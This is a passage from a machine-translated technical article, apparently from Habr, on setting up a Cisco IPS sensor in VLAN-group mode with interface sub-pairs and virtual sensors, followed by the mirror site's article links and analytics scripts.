Interface-pair and VLAN-pair, it also allows you to use VLAN-group-mode. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">We assume that ports 6500 are connected to IPS as follows:</font></font><br><blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6500 Gi0 / 48 &lt;-&gt; IPS Gi0 / 0 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6500 Gi0 / 47 &lt;-&gt; IPS Gi0 / 1</font></font><br></blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Accordingly, the first thing Gi0 / 0 and Gi0 / 1 need to pair: </font></font><br><br><img src="https://habrastorage.org/getpro/habr/post_images/a4c/b21/7c3/a4cb217c3308f994b53dd456d00f00a0.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">After you have created a physical pair of interfaces, you can create ‚Äúsub-pairs‚Äù on it. For each sub-pair of interfaces, you can specify a group of VLANs that it will process. The unassigned group means all VLANs that were not explicitly assigned to any other sub-pair. Suppose that in VLAN20 we have particularly critical servers, and in VLAN30 and 40 - all the rest. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">We will create two sub-pairs and assign all the VLANs that fall on the sensor for one sub-pair, and only VLAN20 for the second: We assign </font></font><br><br><img src="https://habrastorage.org/getpro/habr/post_images/656/13e/b20/65613eb20b43a41d7054bec018c004ed.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">each sub-pair to separate virtual sensors:</font></font><br><br><img src="https://habrastorage.org/getpro/habr/post_images/083/cff/229/083cff229a240f6b4a7ecb2e41069c9d.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">As a result of this setting, the sensor vs1 will get traffic from / to VLAN20, and on vs0 - the rest. </font><font style="vertical-align: inherit;">For each sensor, you can enable a different set of signatures, create different rules for blocking and exceptions, and also maintain independent Anomaly Detection databases. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If you use etherchannel - all steps must be repeated for each physical pair of interfaces participating in the aggregated channel. </font><font style="vertical-align: inherit;">Accordingly, for each physical pair, you need to create the same set of sub-pairs and all of them are tied to the appropriate interfaces. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ie, if we have, for example, the following connection scheme: </font></font><br><br><img src="https://habrastorage.org/getpro/habr/post_images/0df/a28/cbe/0dfa28cbe8222b6781e6d6b1c0b74004.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Then the VLAN-group setting will look like this:</font></font><br><br><img src="https://habrastorage.org/getpro/habr/post_images/3e9/cf8/e17/3e9cf8e17da08842775d88a8075016a0.png"><br><br><h4> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6) </font></font><u><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Epilogue</font></font></u></b> </h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The proposed scheme is certainly not the only possible one, but it fits very well with the settings of the sensor, as well as time tested. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">It turned out of course volume, but I hope it is interesting. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">All successful reflection of attacks! </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Next time I may write about ways to receive and analyze events from IPS.</font></font><br><habracut text=""></habracut></div><p>Source: <a href="https://habr.com/ru/post/215641/">https://habr.com/ru/post/215641/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../215625/index.html">Epson: habradebut</a></li>
<li><a href="../215627/index.html">Soviet operation to save the dead space station</a></li>
<li><a href="../215629/index.html">Labor market research web developers</a></li>
<li><a href="../215635/index.html">Download music and video from VC using Chrome browser using its extension</a></li>
<li><a href="../215637/index.html">What happens if you decide to assemble a 3D printer with your own hands</a></li>
<li><a href="../215645/index.html">Clever image cropping using point of focus</a></li>
<li><a href="../215647/index.html">Android SDK vs NDK - comparing the performance of similar types of code</a></li>
<li><a href="../215651/index.html">Application on Express.js + Sass / Compass + CoffeeScript + Haml</a></li>
<li><a href="../215653/index.html">We use nginx, docker, skydns and skydock to update the code on the fly (zero-downtime deployment)</a></li>
<li><a href="../215655/index.html">Downloading historical data to SAP using LSMW (Legacy System Migration Workbench)</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>